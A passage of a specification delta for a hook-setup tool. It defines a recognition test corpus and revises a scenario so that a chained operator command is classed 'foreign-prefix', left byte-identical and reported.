> arguments inside the `crewrig-mempalace-transcript` named hook. They SHALL
> also include both paths on a command that fails the shell-safety rule inside
> that named hook, beside an own transcript command on the same event. The
> corpus `scripts/tests/fixtures/mempalace-transcript/recognition-corpus.json`
> SHALL hold, at the implementation PR's head, the 99 rows on which both twins
> agree. Those rows SHALL include the 21 rows that move from `no` to
> `foreign-prefix` with their command unchanged, the 25 added rows, and the
> rows that keep their class, all three sets as the scenario "The corpus pins
> the shell-safety class in both twins" (delta-03) lists them. Among the added
> rows, two are negative witnesses classed `no`: a command carrying syntax
> whose script name is followed by `.bak`, and one naming the script with no
> `/` before it. A later change MAY add rows. It SHALL NOT change the class of
> any of these rows without a delta of this spec.

### Scenario "A chained operator command is never touched" (owner ruling of 2026-10-07)

The out-of-signature rule of requirement 24 now reaches this command, so the
scenario changes. Original:

> **Scenario:** A chained operator command is never touched
>
> Given an entry reading `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`
> When setup runs
> Then it is not rewritten, kept, deduplicated or removed, in the Bash predicate
> and in the TypeScript recogniser alike.

Replacement:

> **Scenario:** A chained operator command is left alone and blocks the add
>
> Given an entry reading `bash /opt/prep.sh && bash /repo/hooks/mempalace-transcript.sh`
> When setup runs, whatever the answer to the session-recording question
> Then the Bash predicate and the TypeScript recogniser both class it
> `foreign-prefix`. It is neither rewritten nor removed and stays
> byte-identical, it is reported, and on the enable path its event receives no
> direct-form command.

## REMOVED

Nothing is removed.
